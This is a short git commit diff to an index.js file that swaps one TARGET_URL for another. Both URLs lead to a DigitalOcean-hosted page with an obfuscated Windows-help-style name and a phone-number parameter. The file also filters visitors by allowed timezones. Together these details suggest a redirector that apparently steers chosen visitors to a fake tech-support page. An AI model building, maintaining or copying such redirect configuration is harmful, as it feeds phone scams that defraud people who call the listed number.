08e2b3e2d11d5c94790bd9e780c56f5584cc3f8f
paalakash <palaksh452@gmail.com>
2026-06-24 11:47:33 +0530

    Update index.js

--- index.js
+++ index.js
@@ -30,7 +30,7 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Target URL Configuration
-const TARGET_URL = "https://coral-app-2-f39er.ondigitalocean.app/Wi0nHelpInfogetPocode/index.html?Anph=0101-833-306-1171";
+const TARGET_URL = "https://coral-app-2-f39er.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-306-1171";
 
 // --- Pre-Compilation Cache Layer ---
 // This processes everything into memory ONCE during boot, removing CPU load during requests.
